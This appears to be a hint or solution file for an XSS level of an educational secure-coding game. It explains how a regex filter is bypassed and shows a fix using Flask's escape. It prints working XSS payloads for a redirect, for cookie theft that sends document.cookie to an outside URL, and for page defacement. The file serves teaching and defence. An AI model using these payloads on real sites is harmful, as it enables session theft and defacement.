@@ -1,0 +1,65 @@
+# Contribute new levels to the game in 3 simple steps!
+# Read our Contribution Guideline at github.com/skills/secure-code-game/blob/main/CONTRIBUTING.md
+
+This code is vulnerable to Cross-Site Scripting (XSS).
+
+Learn more about Cross-Site Scripting (XSS): https://portswigger.net/web-security/cross-site-scripting
+Example from a security advisory: https://securitylab.github.com/advisories/GHSL-2023-084_Pay/ 
+
+Back to our level in the Secure Code Game, the vulnerable functions are:
+- get_planet_info()
+- get_planet_info_endpoint()
+
+Why are they vulnerable?
+
+Examine closely the following:
+sanitized_planet = re.sub(r'[<>(){}[\]]', '', planet)
+
+In this regex, the characters 
+<, >, (, ), {, }, [, and ] 
+are explicitly removed, but whitespace characters are not removed.
+
+Then, an anti-XSS defense is implemented, preventing inputs with the 'script' tag. 
+However, other tags, such as the 'img' tag, can still used to exploit a XSS bug as follows:
+
+Exploit: 
+<<img src="x" onerror="alert(1)">>
+ 
+Explanation: 
+In this payload, the double angle brackets, '<<' and '>>', will not be matched by the regex, 
+so the payload remains unaffected, and the XSS attack will execute successfully.
+
+How can we fix this?
+We can use the function 'escape', which is a built-in function inside the Markup module of Flask. 
+This function helps to escape special characters in the input, preventing them from being executed
+as HTML or JavaScript.
+
+Example: 
+from flask import Flask, request, render_template, jsonify, escape
+
+return f'<h2>Planet Details:</h2><p>{escape(details)}</p>'
+ 
+What else can XSS do?
+- Steal cookies and session information
+- Redirect to malicious websites
+- Modify website content
+- Phishing
+- Keylogging
+
+How to prevent XSS?
+- Sanitize user input properly
+- Use Content Security Policy (CSP)
+- Use HttpOnly Cookies
+- Use X-XSS-Protection header
+
+Here are some exploit examples:
+
+- Redirect to phishing page using XSS:
+<<img src="x" onerror="window.location.href = 'https://google.com';">>
+
+- Get cookies:
+<<img src="x" onerror="window.location.href = 'https://google.com/?cookie=' + document.cookie;">>
+
+- Modify website content:
+You can inject any phishing page, malicious page, or any other content to the website using XSS, by:
+<<img src="x" onerror="document.body.innerHTML = '<h1>Website is hacked</h1>';">>
